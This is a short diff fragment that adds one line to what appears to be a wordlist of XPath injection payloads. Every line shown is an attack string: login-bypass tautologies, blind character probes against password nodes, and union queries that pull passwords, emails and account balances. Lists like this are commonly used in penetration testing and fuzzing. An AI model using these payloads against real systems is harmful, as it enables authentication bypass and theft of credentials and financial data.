@@ -16,6 +16,7 @@ x' or name()='username' or 'x'='y
 ') and starts-with(../password,'c
 count(/child::node())
 x' or name()='username' or 'x'='y
+/key/text() | //emp[true()=']/id']/
 /users/user[username='$username' and password='$password']
 admin']/password/text() | //users/user[username='guest']/email/text()
 ']/key/text() | //accounts[accountid='12345']/balance/text()
